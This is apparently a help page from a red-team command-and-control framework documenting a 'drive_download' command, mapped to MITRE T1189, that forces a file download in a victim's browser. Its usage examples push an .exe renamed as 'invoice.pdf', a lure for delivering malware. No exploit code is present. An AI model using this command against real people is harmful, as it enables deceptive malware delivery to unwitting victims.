+++
title = "drive_download"
chapter = false
weight = 100
hidden = false
+++

## Summary

Trigger a file download in the victim's browser from a URL.
- Needs Admin: False  
- Version: 1  
- Author: @grampae  

### Arguments

#### url

- Description: URL of the file to download to the victim's browser
- Required Value: True  
- Default Value: None  

#### filename

- Description: Filename for the downloaded file (auto-detected from URL if blank)
- Required Value: False  
- Default Value: ""  

## Usage

```
drive_download https://example.com/file.exe
```

```
drive_download {"url":"https://example.com/file.exe","filename":"invoice.pdf"}
```

## MITRE ATT&CK Mapping

- T1189  

## Detailed Summary

Attempts to download a file by fetching it and creating a browser download. If the fetch method fails, it falls back to a direct anchor click. This can be subject to CORS and browser restrictions.
